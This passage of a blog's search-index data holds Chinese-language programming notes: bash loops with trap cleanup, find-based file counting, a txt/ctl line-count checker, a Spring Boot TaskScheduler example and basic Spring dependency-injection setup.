class=\"keyword\">do</span></span><br><span class=\"line\">    (</span><br><span class=\"line\">      <span class=\"built_in\">echo</span> <span class=\"string\">\"loop #<span class=\"variable\">$loop</span>\"</span></span><br><span class=\"line\">      mp3convert</span><br><span class=\"line\">      <span class=\"built_in\">echo</span> magic 1</span><br><span class=\"line\">      <span class=\"built_in\">echo</span> magic 2</span><br><span class=\"line\">      <span class=\"built_in\">echo</span> magic 3</span><br><span class=\"line\">    ) &amp;</span><br><span class=\"line\">    PID=$!</span><br><span class=\"line\">    CleanUp</span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"done loop #<span class=\"variable\">$loop</span>\"</span></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure>\n<p>測試結果，還真的有用<br>開兩個 cmd ，一個執行，另一個kill<br>並不會直接結束</p>\n<p>參考:<a href=\"https://stackoverflow.com/questions/26808727/bash-trap-interrupt-command-but-should-exit-on-end-of-loop\" target=\"_blank\" rel=\"noopener\">shell - bash trap interrupt command but should exit on end of loop - Stack Overflow</a></p>\n<p>trap 相關指令，可以用來可以控制關閉方法</p>\n<ul>\n<li><a href=\"http://coinfaces.me/posts/gracefully-stop-docker-init-bash-script/\" target=\"_blank\" rel=\"noopener\">优雅地结束docker容器的init bash脚本</a></li>\n<li><a href=\"http://blog.gitdns.org/2016/08/29/shell-trap/\" target=\"_blank\" rel=\"noopener\">shell-trap | 平凡備忘錄</a></li>\n<li><a href=\"https://blog.gtwang.org/programming/bash-tutorial-parallel-subprocesses-and-wait/\" target=\"_blank\" rel=\"noopener\">Bash 程式設計教學：平行執行背景子行程，用 wait 等待工作結束 - G. T. Wang</a></li>\n</ul>\n<h2 id=\"調整完美關閉腳本\"><a href=\"#調整完美關閉腳本\" class=\"headerlink\" title=\"調整完美關閉腳本\"></a>調整完美關閉腳本</h2><p>TODO: 待修改</p>\n","categories":["Linux"],"tags":["shell"]},{"title":"Shell 快速統計資料夾下底層檔案數量","url":"/blog/2019/11/12/Shell-%E5%BF%AB%E9%80%9F%E7%B5%B1%E8%A8%88%E8%B3%87%E6%96%99%E5%A4%BE%E4%B8%8B%E5%BA%95%E5%B1%A4%E6%AA%94%E6%A1%88%E6%95%B8%E9%87%8F/","content":"<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> */ .*/ ; <span class=\"keyword\">do</span>      <span class=\"built_in\">echo</span> -n <span class=\"variable\">$i</span><span class=\"string\">\": \"</span> ;      (find <span class=\"string\">\"<span class=\"variable\">$i</span>/\"</span> -maxdepth 1 -mindepth 1 -<span class=\"built_in\">type</span> d | wc -l) ;  <span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure>\n<p>mindepth 0 數字是指<code>.</code>本層開始搜尋的(包含.)自己，但通常會用 1(不包含 <code>.</code>)<br>maxdepth 1 數字是使<code>.</code>往後搜尋資料夾</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> */ .*/ ; <span class=\"keyword\">do</span>      <span class=\"built_in\">echo</span> -n <span class=\"variable\">$i</span><span class=\"string\">\": \"</span> ;      (find <span class=\"string\">\"<span class=\"variable\">$i</span>\"</span> -maxdepth 3 -<span class=\"built_in\">type</span> f -name <span class=\"string\">\"*.docx\"</span> | wc -l) ;  <span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure>\n<p><a href=\"https://stackoverflow.com/questions/9157138/recursively-counting-files-in-a-linux-directory\" target=\"_blank\" rel=\"noopener\">Recursively counting files in a Linux directory - Stack Overflow</a></p>\n<h2 id=\"find-確認資料夾是否有檔案\"><a href=\"#find-確認資料夾是否有檔案\" class=\"headerlink\" title=\"find 確認資料夾是否有檔案\"></a>find 確認資料夾是否有檔案</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> [ `find . -mindepth 1  | wc -l ` -gt 0 ]; <span class=\"keyword\">then</span> <span class=\"built_in\">echo</span> <span class=\"string\">\"test\"</span>; <span class=\"keyword\">fi</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"awk-指令\"><a href=\"#awk-指令\" class=\"headerlink\" title=\"awk 指令\"></a>awk 指令</h2><p>echo 1 2 3 4 5 | awk {print 1}</p>\n<h2 id=\"深入-find-指令\"><a href=\"#深入-find-指令\" class=\"headerlink\" title=\"深入 find 指令\"></a>深入 find 指令</h2><p>發現 find 指令順序也有關係</p>\n<p><a href=\"http://lifegoo.pluskid.org/wiki/UtilFind.html\" target=\"_blank\" rel=\"noopener\">find 实用程序</a><br><a href=\"https://www.oracle.com/technetwork/cn/topics/calish-find-096463-zhs.html\" target=\"_blank\" rel=\"noopener\">Linux Find 命令精通指南</a><br><a href=\"http://www.voidcn.com/article/p-bgvmodwd-pg.html\" target=\"_blank\" rel=\"noopener\">find命令的几个例子解析(-a,-o,-path,-wholename,-prnue,-print) - 程序园</a></p>\n","categories":["Linux"],"tags":["linux","shell"]},{"title":"Shell 檢查 txt 和 總數確認檔方法","url":"/blog/2020/07/19/Shell-%E6%AA%A2%E6%9F%A5-txt-%E5%92%8C-%E7%B8%BD%E6%95%B8%E7%A2%BA%E8%AA%8D%E6%AA%94%E6%96%B9%E6%B3%95/","content":"<p>最近要人工分開 txt檔案<br>因為確認檔案花很多眼力去做調整<br>偶爾會有改錯情形<br>為了不發生這個原因<br>我做個簡單調整</p>\n<a id=\"more\"></a>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\">FILE_LIST=(`ls *.txt *.ctl`)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># echo $&#123;#FILE_LIST[@]&#125;;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"variable\">$&#123;!FILE_LIST[@]&#125;</span>; <span class=\"keyword\">do</span></span><br><span class=\"line\">\tFILE_LIST[<span class=\"variable\">$i</span>]=<span class=\"string\">\"<span class=\"variable\">$&#123;FILE_LIST[$i]%.*&#125;</span>\"</span></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># echo \"$&#123;FILE_LIST[@]&#125;\" | tr ' ' '\\n' | sort -u</span></span><br><span class=\"line\">FILE_LIST=($(<span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$&#123;FILE_LIST[@]&#125;</span>\"</span> | tr <span class=\"string\">' '</span> <span class=\"string\">'\\n'</span> | sort -u ))</span><br><span class=\"line\"><span class=\"comment\"># echo $&#123;#FILE_LIST[@]&#125;;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"variable\">$&#123;!FILE_LIST[@]&#125;</span>; <span class=\"keyword\">do</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> [ -f <span class=\"variable\">$&#123;FILE_LIST[$i]&#125;</span>.txt ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">\t    <span class=\"comment\"># 檔案 /path/to/dir/filename 存在</span></span><br><span class=\"line\">\t    <span class=\"built_in\">echo</span> <span class=\"string\">\"File <span class=\"variable\">$&#123;FILE_LIST[$i]&#125;</span>.txt exists.\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t    <span class=\"comment\"># 檔案 /path/to/dir/filename 不存在</span></span><br><span class=\"line\">\t    <span class=\"built_in\">echo</span> <span class=\"string\">\"File <span class=\"variable\">$&#123;FILE_LIST[$i]&#125;</span>.txt does not exists.\"</span></span><br><span class=\"line\">\t    <span class=\"built_in\">continue</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">fi</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> [ -f <span class=\"variable\">$&#123;FILE_LIST[$i]&#125;</span>.ctl ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">\t    <span class=\"comment\"># 檔案 /path/to/dir/filename 存在</span></span><br><span class=\"line\">\t    <span class=\"built_in\">echo</span> <span class=\"string\">\"File <span class=\"variable\">$&#123;FILE_LIST[$i]&#125;</span>.ctl exists.\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t    <span class=\"comment\"># 檔案 /path/to/dir/filename 不存在</span></span><br><span class=\"line\">\t    <span class=\"built_in\">echo</span> <span class=\"string\">\"File <span class=\"variable\">$&#123;FILE_LIST[$i]&#125;</span>.ctl does not exists.\"</span></span><br><span class=\"line\">\t    <span class=\"built_in\">continue</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">fi</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tFIRST_LINE=$(head -n 1 <span class=\"variable\">$&#123;FILE_LIST[$i]&#125;</span>.ctl)</span><br><span class=\"line\"></span><br><span class=\"line\">\tLINE_COUNT=$(cat <span class=\"variable\">$&#123;FILE_LIST[$i]&#125;</span>.txt | wc -l)</span><br><span class=\"line\">\t<span class=\"comment\">#https://unix.stackexchange.com/questions/232384/argument-string-to-integer-in-bash/232386</span></span><br><span class=\"line\">\t<span class=\"built_in\">echo</span> <span class=\"string\">\"TXT:    <span class=\"variable\">$((LINE_COUNT+1)</span>)\"</span></span><br><span class=\"line\">\t<span class=\"built_in\">echo</span> <span class=\"string\">\"CTL:    <span class=\"variable\">$FIRST_LINE</span>\"</span> ;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> [ <span class=\"string\">\"<span class=\"variable\">$FIRST_LINE</span>\"</span> = $((LINE_COUNT+1)) ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">\t\t<span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$&#123;FILE_LIST[$i]&#125;</span> 正確\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t<span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$&#123;FILE_LIST[$i]&#125;</span> 不正確!!!!!!!!!!!!!!!!!!\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">fi</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"><span class=\"comment\">#https://stackoverflow.com/questions/13648410/how-can-i-get-unique-values-from-an-array-in-bash</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\"><span class=\"comment\"># line=$(head -n 1 filename)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># https://stackoverflow.com/questions/3137094/how-to-count-lines-in-a-document</span></span><br><span class=\"line\"><span class=\"comment\"># cat /dir/file.txt | wc -l</span></span><br></pre></td></tr></table></figure>","categories":["Linux"],"tags":["shell"]},{"title":"Spring Boot TaskScheduler 簡單實作起手勢","url":"/blog/2020/09/14/Spring-Boot-TaskScheduler-%E7%B0%A1%E5%96%AE%E5%AF%A6%E4%BD%9C%E8%B5%B7%E6%89%8B%E5%8B%A2/","content":"<p>最近看到 Spring Boot TaskScheduler 簡單的範例<br>就簡單實作<br>沒想到這麼簡單</p>\n<a id=\"more\"></a>\n<h2 id=\"簡單實作\"><a href=\"#簡單實作\" class=\"headerlink\" title=\"簡單實作\"></a>簡單實作</h2><ol>\n<li><p>@EnableScheduling<br>在 @SpringBootApplication 下面配置 @EnableScheduling</p>\n</li>\n<li><p>配置 Task 類別</p>\n</li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Component</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ScheduledTask</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> SimpleDateFormat dateFormat = <span class=\"keyword\">new</span> SimpleDateFormat(<span class=\"string\">\"yyyy-MM-dd HH:mm:ss\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Integer count0 = <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Integer count1 = <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Integer count2 = <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Scheduled</span>(fixedRate = <span class=\"number\">5000</span>)</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">reportCurrentTime</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> InterruptedException </span>&#123;</span><br><span class=\"line\">        System.out.println(String.format(<span class=\"string\">\"---第%s次執行，當前時間為：%s\"</span>, count0++, dateFormat.format(<span class=\"keyword\">new</span> Date())));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Scheduled</span>(fixedDelay = <span class=\"number\">5000</span>)</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">reportCurrentTimeAfterSleep</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> InterruptedException </span>&#123;</span><br><span class=\"line\">        System.out.println(String.format(<span class=\"string\">\"===第%s次執行，當前時間為：%s\"</span>, count1++, dateFormat.format(<span class=\"keyword\">new</span> Date())));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Scheduled</span>(cron = <span class=\"string\">\"0 0 1 * * *\"</span>)</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">reportCurrentTimeCron</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> InterruptedException </span>&#123;</span><br><span class=\"line\">        System.out.println(String.format(<span class=\"string\">\"+++第%s次執行，當前時間為：%s\"</span>, count2++, dateFormat.format(<span class=\"keyword\">new</span> Date())));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>參考: <a href=\"https://www.tianmaying.com/tutorial/spring-scheduling-task\" target=\"_blank\" rel=\"noopener\">基於Spring Boot 實現定時任務-springboot,java,spring 相關文章-天碼營</a></p>\n<p>這邊有趣的是 cron 這邊有到秒<br>然後這邊程式是用單線程<br>所以前一個超過時間就不會執行(我看到文章是這樣寫)<br>這邊就不敘述，因為我也不是很懂</p>\n<h2 id=\"相關文章\"><a href=\"#相關文章\" class=\"headerlink\" title=\"相關文章\"></a>相關文章</h2><ul>\n<li><a href=\"https://docs.spring.io/spring/docs/3.2.x/spring-framework-reference/html/scheduling.html\" target=\"_blank\" rel=\"noopener\">27. Task Execution and Scheduling</a></li>\n<li><a href=\"https://blog.csdn.net/f641385712/article/details/89442241\" target=\"_blank\" rel=\"noopener\">【小家Spring】Spring任务调度@Scheduled的使用以及原理、源码分析（@EnableScheduling）_YourBatman-CSDN博客</a></li>\n<li><a href=\"http://qinghua.github.io/spring-scheduler/\" target=\"_blank\" rel=\"noopener\">Spring Scheduler的使用与坑 | 懒程序员改变世界</a></li>\n<li><a href=\"http://betterlxc.com/2017/09/SpringBoot%E4%B8%AD%E4%BD%BF%E7%94%A8%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E5%99%A8%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/\" target=\"_blank\" rel=\"noopener\">SpringBoot中使用任务调度器的注意事项</a></li>\n<li><a href=\"http://buraktas.com/spring-schedule-tutorial/\" target=\"_blank\" rel=\"noopener\">Spring Schedule Tutorial · Burak Aktas</a></li>\n<li><a href=\"https://www.callicoder.com/spring-boot-task-scheduling-with-scheduled-annotation/\" target=\"_blank\" rel=\"noopener\">How to Schedule Tasks with Spring Boot | CalliCoder</a></li>\n<li><a href=\"https://stackoverflow.com/questions/41903782/spring-boot-shutdown-with-scheduler\" target=\"_blank\" rel=\"noopener\">java - Spring Boot Shutdown with Scheduler - Stack Overflow</a></li>\n<li><a href=\"https://www.tianmaying.com/tutorial/spring-scheduling-task\" target=\"_blank\" rel=\"noopener\">基於Spring Boot 實現定時任務-springboot,java,spring 相關文章-天碼營</a></li>\n<li><a href=\"https://www.xuxueli.com/xxl-job/#5.4.1%20quartz%E7%9A%84%E4%B8%8D%E8%B6%B3\" target=\"_blank\" rel=\"noopener\">分布式任务调度平台XXL-JOB</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/79644891\" target=\"_blank\" rel=\"noopener\">在Spring Boot中优雅的实现定时任务 - 知乎</a></li>\n<li><a href=\"https://mianshenglee.github.io/2019/06/04/springbatch(1\" target=\"_blank\" rel=\"noopener\">数据批处理神器-Spring Batch(1)简介及使用场景 | mason’s blog</a>.html)</li>\n<li><a href=\"https://developer.aliyun.com/article/488617\" target=\"_blank\" rel=\"noopener\">动态改变Spring定时任务执行频率-阿里云开发者社区</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000018707820\" target=\"_blank\" rel=\"noopener\">Springboot定时任务踩坑记录 - 技术杂谈 - SegmentFault 思否</a></li>\n<li><a href=\"https://www.baeldung.com/spring-boot-shutdown\" target=\"_blank\" rel=\"noopener\">Shutdown a Spring Boot Application | Baeldung</a></li>\n</ul>\n<p>Spring Batch 跟 Spring Boot Task 是不一樣東西…</p>\n<h2 id=\"問題\"><a href=\"#問題\" class=\"headerlink\" title=\"問題\"></a>問題</h2><p>我在想程是執行中那要怎麼關閉程式呢?<br>我想改一個方法就要把所有程式關掉<br>這樣執行中程式不是就會有問題</p>\n<p>不過，也有可能 Spring Boot Task 應該只要放一個任務工作程式就沒這個問題?<br>但實務上是不是這樣做就不知道了</p>\n","categories":["Java"],"tags":["spring","taskscheduler"]},{"title":"Spring 建立應用程式起手式","url":"/blog/2020/05/02/Spring-%E5%BB%BA%E7%AB%8B%E6%87%89%E7%94%A8%E7%A8%8B%E5%BC%8F%E8%B5%B7%E6%89%8B%E5%BC%8F/","content":"<p>最近看了一些 Spring 教學<br>這篇整理一下建制 Spring 需要步驟</p>\n<a id=\"more\"></a>\n<h2 id=\"Eclipse-使用-Maven-建置-Spring\"><a href=\"#Eclipse-使用-Maven-建置-Spring\" class=\"headerlink\" title=\"Eclipse 使用 Maven 建置 Spring\"></a>Eclipse 使用 Maven 建置 Spring</h2><img src=\"/blog/2020/05/02/Spring-建立應用程式起手式/eclipse01.png\" title=\"title\">\n<img src=\"/blog/2020/05/02/Spring-建立應用程式起手式/eclipse02.png\" title=\"title\">\n<img src=\"/blog/2020/05/02/Spring-建立應用程式起手式/eclipse03.png\" title=\"title\">\n<img src=\"/blog/2020/05/02/Spring-建立應用程式起手式/eclipse04.png\" title=\"title\">\n<h3 id=\"建置-Maven-預到-Eclipse-警告\"><a href=\"#建置-Maven-預到-Eclipse-警告\" class=\"headerlink\" title=\"建置 Maven 預到 Eclipse 警告\"></a>建置 Maven 預到 Eclipse 警告</h3><p>參考:<a href=\"http://twsyuan.com/2018/06/maven%E9%8C%AF%E8%AA%A4-001/\" target=\"_blank\" rel=\"noopener\">Maven錯誤 – #001 – JDK預設版本1.5 – Syuan的筆記</a></p>\n<p>不知道是我的 Eclipse 自帶 Maven<br>我測試把 setting.xml 複製到 <code>C:\\Users\\Administrator\\.m2</code><br>我是用 Chocolatey 安裝 Maven<br>可以到<code>C:\\ProgramData\\Chocolatey\\lib\\maven</code> 找到 setting.xml<br>因為我安裝是 1.13 JDK 版本，所以這邊調整 1.13<br><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"> <span class=\"tag\">&lt;<span class=\"name\">profiles</span>&gt;</span></span><br><span class=\"line\"> \t<span class=\"tag\">&lt;<span class=\"name\">profile</span>&gt;</span>   </span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">id</span>&gt;</span>jdk1.13<span class=\"tag\">&lt;/<span class=\"name\">id</span>&gt;</span>    </span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">activation</span>&gt;</span>   </span><br><span class=\"line\">       <span class=\"tag\">&lt;<span class=\"name\">activeByDefault</span>&gt;</span>true<span class=\"tag\">&lt;/<span class=\"name\">activeByDefault</span>&gt;</span>    </span><br><span class=\"line\">       <span class=\"tag\">&lt;<span class=\"name\">jdk</span>&gt;</span>1.13<span class=\"tag\">&lt;/<span class=\"name\">jdk</span>&gt;</span>   </span><br><span class=\"line\">   <span class=\"tag\">&lt;/<span class=\"name\">activation</span>&gt;</span>   </span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">properties</span>&gt;</span>   </span><br><span class=\"line\">       <span class=\"tag\">&lt;<span class=\"name\">maven.compiler.source</span>&gt;</span>1.13<span class=\"tag\">&lt;/<span class=\"name\">maven.compiler.source</span>&gt;</span>    </span><br><span class=\"line\">       <span class=\"tag\">&lt;<span class=\"name\">maven.compiler.target</span>&gt;</span>1.13<span class=\"tag\">&lt;/<span class=\"name\">maven.compiler.target</span>&gt;</span>    </span><br><span class=\"line\">       <span class=\"tag\">&lt;<span class=\"name\">maven.compiler.compilerVersion</span>&gt;</span>1.13<span class=\"tag\">&lt;/<span class=\"name\">maven.compiler.compilerVersion</span>&gt;</span>   </span><br><span class=\"line\">   <span class=\"tag\">&lt;/<span class=\"name\">properties</span>&gt;</span>   </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">profile</span>&gt;</span></span><br><span class=\"line\">   <span class=\"comment\">&lt;!-- profile</span></span><br></pre></td></tr></table></figure></p>\n<p>這樣建置新專案就不會有問題了</p>\n<h2 id=\"一般呼叫-Object\"><a href=\"#一般呼叫-Object\" class=\"headerlink\" title=\"一般呼叫 Object\"></a>一般呼叫 Object</h2><figure class=\"highlight java\"><figcaption><span>Application.java</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> hello;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Application</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tSystem.out.println(<span class=\"string\">\"application\"</span>);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tMessagePrinter printer = <span class=\"keyword\">new</span> MessagePrinter();</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tMessageService service = <span class=\"keyword\">new</span> MessageService();</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tprinter.setService(service);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tprinter.printMessage();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><figcaption><span>MessagePrinter.java</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> hello;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.stereotype.Component;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MessagePrinter</span> </span>&#123;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">\t * 設定 MessageService 關係</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">\t<span class=\"keyword\">private</span> MessageService service;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">MessagePrinter</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">super</span>();</span><br><span class=\"line\">\t\tSystem.out.println(<span class=\"string\">\"MessagePrinter...\"</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">\t * 設定 service 值</span></span><br><span class=\"line\"><span class=\"comment\">\t * <span class=\"doctag\">@param</span> service</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">\t<span class=\"meta\">@Autowired</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">setService</span><span class=\"params\">(MessageService service)</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>.service = service;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">printMessage</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\tSystem.out.print(<span class=\"keyword\">this</span>.service.getMessage());</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><figcaption><span>MessageService.java</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> hello;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.stereotype.Component;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MessageService</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">MessageService</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">super</span>();</span><br><span class=\"line\">\t\tSystem.out.println(<span class=\"string\">\"MessageService...\"</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">\t * print Hello World</span></span><br><span class=\"line\"><span class=\"comment\">\t * <span class=\"doctag\">@return</span> print Hello World</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">getMessage</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"string\">\"Hello World\"</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Spring-Autowired-方式-annotation\"><a href=\"#Spring-Autowired-方式-annotation\" class=\"headerlink\" title=\"Spring Autowired 方式(annotation)\"></a>Spring Autowired 方式(annotation)</h2><p>這邊簡單說幾個 annotation 重點<br>@Component<br>@ComponentScan 標籤需要放在主程式，會掃有關 @Component<br>@Autowired 放在 setXXXX(MessageService service)<br>這邊跟我公司實戰上不時一樣<br>但這應該是最原始寫法</p>\n<figure class=\"highlight java\"><figcaption><span>ApplicationSpring.java</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> hello;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.context.ApplicationContext;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.context.annotation.AnnotationConfigApplicationContext;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.context.annotation.ComponentScan;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 可以掃描 <span class=\"doctag\">@Component</span></span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"meta\">@ComponentScan</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ApplicationSpring</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"keyword\">static</span> ApplicationContext context;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tSystem.out.println(<span class=\"string\">\"applicationSpring\"</span>);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tcontext = <span class=\"keyword\">new</span> AnnotationConfigApplicationContext(ApplicationSpring.class);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"comment\">// 從容器中獲取 MessagePrinter  物件</span></span><br><span class=\"line\">\t\tMessagePrinter printer = context.getBean(MessagePrinter.class);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\"><span class=\"comment\">//\t\tMessageService service = context.getBean(MessageService.class);</span></span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tSystem.out.println(printer);</span><br><span class=\"line\"><span class=\"comment\">//\t\tSystem.out.println(service);</span></span><br><span 